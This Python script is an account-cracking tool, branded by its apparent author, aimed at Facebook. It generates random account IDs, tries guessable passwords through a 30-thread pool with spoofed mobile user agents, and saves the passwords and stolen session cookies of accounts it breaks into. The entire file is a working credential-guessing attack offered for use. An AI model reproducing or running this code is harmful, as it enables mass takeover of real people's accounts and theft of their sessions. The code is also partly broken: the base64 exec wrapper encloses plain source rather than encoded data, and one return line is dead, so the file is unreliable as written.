import base64
exec(base64.b64decode('#S9UR9BH
# -*- coding: utf-8 -*-
import os
import sys
import json
import uuid
import string
import random,platform,subprocess,hashlib
import requests,re,time
from concurrent.futures import ThreadPoolExecutor as tred
class Mr_Code:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.gen = []        
    
    def banner(self):
        os.system("clear" if os.name != "nt" else "cls")
        print("\033[1;37m")
        print("    .d8b   db    db .d8888  ")
        print("   d8' `8b `8b  d8' 88'  YP   ")
        print("   88ooo88  `8bd8'  `8bo     ")
        print("   88~~~88  .dPYb     `Y8b     ")
        print("   88   88 .8P  Y8  db   8D   ")
        print("   YP   YP YP    YP `8888Y' \033[1;32mS4UR4BH")
        print("\033[38;5;250m═════════════════════════════════════════")
        print("\033[1;32m   \033[1;37mTool Owner \033[38;5;208m  \033[1;37mSaurabh Kumar Meena")
        print("\033[1;32m   \033[1;37mGitHub     \033[38;5;208m  \033[1;37mhttps://github.com/BABU-XD")
        print("\033[1;32m   \033[1;37mType       \033[38;5;208m  \033[1;37mRandom")
        print("\033[1;32m   \033[1;37mVersion    \033[38;5;208m  \033[1;39m[1.0🦋]")
        print("═════════════════════════════════════════")
    # def method(self, uid, passlist):
    #     for pw in passlist:
    #         # Dummy simulation � replace with actual login logic
    #         print(f"[TRYING] {uid} | {pw}")
    #         if pw.endswith("00"):  # Simulated "OK" condition
    #             print(f"[OK] {uid} | {pw}")
    #             self.oks.append(uid)
    #             break
    #         else:
    #             continue
    #     else:
    #         print(f"[CP] {uid} | {passlist[0]}")
    #         self.cps.append(uid)
    def Main(self):
        self.banner()
        code = input("   Choose Code -  ").strip()
        limit = int(input("   Your Limit  -  ").strip())
        print("═════════════════════════════════════════")
        for _ in range(limit):
            rand_6digit = ''.join(random.choice(string.digits) for _ in range(6))
            self.gen.append(rand_6digit)
        print("   TURN ON/OFF FLIGHT MODE\n")
        print("═════════════════════════════════════════")
        with tred(max_workers=30) as executor:
            for number in self.gen:
                uid = code + number
                passlist = [uid[:6], uid, uid[:8], number[:6], "57273200"]
                executor.submit(self.method, uid, passlist)

        print("\nCLONING COMPLETE.")
        print(f"TOTAL OK: {len(self.oks)}")
        print(f"TOTAL CP: {len(self.cps)}")
        print("═════════════════════════════════════════")
    
    def method(self,ids,passlist):
        global loop,oks,cps
        session = requests.Session()
        #g = random.choice(samsung_user_agent())
        sys.stdout.write(f"\r\r\x1b[m   AXS|{self.loop}|OK:-{len(self.oks)}|CP:-{len(self.cps)}")
        sys.stdout.flush()
        try:
            for pas in passlist:
                bal = "https://touch.facebook.com/"
                boro_bara = session.get(bal)
                loda_Lega = {'m_ts': re.search(r'name="m_ts" value="(.*?)"', str(boro_bara.text)).group(1), 'li': re.search(r'name="li" value="(.*?)"', str(boro_bara.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': ids, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(int(time.time()), pas), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search(r'name="jazoest" value="(.*?)"', str(boro_bara.text)).group(1), 'lsd': re.search(r'name="lsd" value="(.*?)"', str(boro_bara.text)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(list("0123456789")), '__fmt': '0', '__a': '', '__user': '0'}
                achha = {
                'authority': 'web.facebook.com',
                'method': 'POST',
                'path': '/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzU4MjU3MTIyLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next',
                'scheme': 'https',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'I-TW, N-SE;q=0.6, --VE;q=0.9',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'dpr': '3',
                'origin': 'https://web.facebook.com',
                'referer': 'https://web.facebook.com/?_rdc=1&_rdr',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
                'sec-ch-ua-full-version-list': '"Not A(Brand";v="24.0.0.0", "Chromium";v="530.0.0.48.74"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Linux"',
                'sec-ch-ua-platform-version': '""',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': iqoo_user_agent(),
                'viewport-width': '2705',}
                meRa_Link = "https://web.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8"
                session.post(url=meRa_Link,data=loda_Lega,headers=achha)
                log_cookies = session.cookies.get_dict().keys()
                if "c_user" in log_cookies:
                    kuki = ";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs']])
                    user = re.findall('c_user=(.*);xs', kuki)[0]
                    req = requests.get(f"https://graph.facebook.com/{user}/picture?type=normal").text
                    if "Photoshop" in req:
                        print(f"\r\r\x1b[38;5;46mOK • {user} • {pas}")
                        print(f"\033[38;5;220mCookies:\033[0m {kuki}")
                        open("/sdcard/AXS-OK.txt", "a").write(user + "|" + pas + "|" + kuki + "\n")
                        self.oks.append(user)
                        break
                elif "checkpoint" in log_cookies:
                    open("/sdcard/AXS-CP.txt", "a").write(ids + "|" + pas + "\n")
                    self.cps.append(ids)
                    break
                else:
                    continue
            self.loop += 1
        except Exception:
            pass
   
iqoo_user_agent=[]
import random
def iqoo_user_agent():
    android_versions=["11","12","13","14"]
    iqoo_models=["V2230","V2238","V2243","V2254","V2259","V2265","V2271","V2279","V2283","V2290","V2299","V2303","V2307","V2311","V2314","V2319","V2323","V2329","V2331"]
    chrome=f"{random.randint(110,125)}.0.{random.randint(4000,6999)}.{random.randint(100,199)}"
    build=random.choice(["RP1A","RKQ1","SD1A","TP1A","UP1A"])+str(random.randint(100,999))
    return f"Mozilla/5.0 (Linux; Android {random.choice(android_versions)}; {random.choice(iqoo_models)} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Mobile Safari/537.36" 
    return ua
# Start the script
if __name__ == "__main__":
    Mr_Code().Main()').decode())